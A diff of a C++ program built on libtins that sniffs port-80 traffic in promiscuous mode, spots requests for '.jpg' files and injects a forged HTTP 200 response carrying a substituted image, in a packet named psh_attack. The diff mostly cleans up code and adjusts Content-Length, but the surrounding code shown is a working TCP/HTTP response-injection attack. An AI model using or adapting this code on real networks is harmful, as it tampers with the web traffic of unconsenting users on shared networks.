@@ -3,7 +3,6 @@
 #include <arpa/inet.h>
 #include <algorithm>
 #include <fstream>
-#include <regex>
 #include <tins/network_interface.h>
 using namespace Tins;
 using namespace std;
@@ -24,13 +23,6 @@ struct pk_set
     {
         return (bool)strstr(_data,".jpg");
 
-//        std::string data(_data);
-//        std::regex pattern(".jpg");
-//        std::smatch result;
-//        if(std::regex_search(data, result, pattern))
-//            return true;
-//        else
-//            return false;
     }
     void image_f()
     {
@@ -48,12 +40,9 @@ struct pk_set
     }
     void sf_set()
     {
-
         SnifferConfiguration config;
         config.set_promisc_mode(true);
         config.set_filter("port 80");
-        config.set_promisc_mode(true);
-        //config.set_timeout(1);
         config.set_immediate_mode(true);
         Sniffer sniffer(sf_dev, config);
         sniffer.sniff_loop(make_sniffer_handler(this, &pk_set::handle));
@@ -88,9 +77,10 @@ struct pk_set
     }
     void chg_send()
     {
-        EthernetII psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\nContent-Length: 1448\n\n")/RawPDU((const uint8_t *)image,len);
+        EthernetII psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\nContent-Length: 1221\n\n")/RawPDU((const uint8_t *)image,len);
         sender.send(psh_attack, sd_dev);
-        //debug(new_ethernet,new_ip,new_tcp);
+        cout<<"send packet\n";
+        debug(new_ethernet,new_ip,new_tcp);
     }
     bool handle(PDU& pdu)
     {
@@ -104,7 +94,7 @@ struct pk_set
             pk_swap(ethernet,ip,tcp);
             tcp_caculator(tcp,payload.size());
             chg_send();
-            cout<<"request packet "<<"\n";
+            cout<<"request packet \n";
             debug(ethernet,ip,tcp);
             cout<<payload.data()<<"\n";
         }
@@ -120,15 +110,12 @@ bool check(int argc, char *argv[])
         path = argv[3];
         return true;
     }
-
     else
     {
         cout<<"<sniffing dev> <send dev> <jpg path>\n";
         return false;
     }
-
 }
-
 int main(int argc, char *argv[])
 {
     cout<<"input wireless adapter mac address : ";
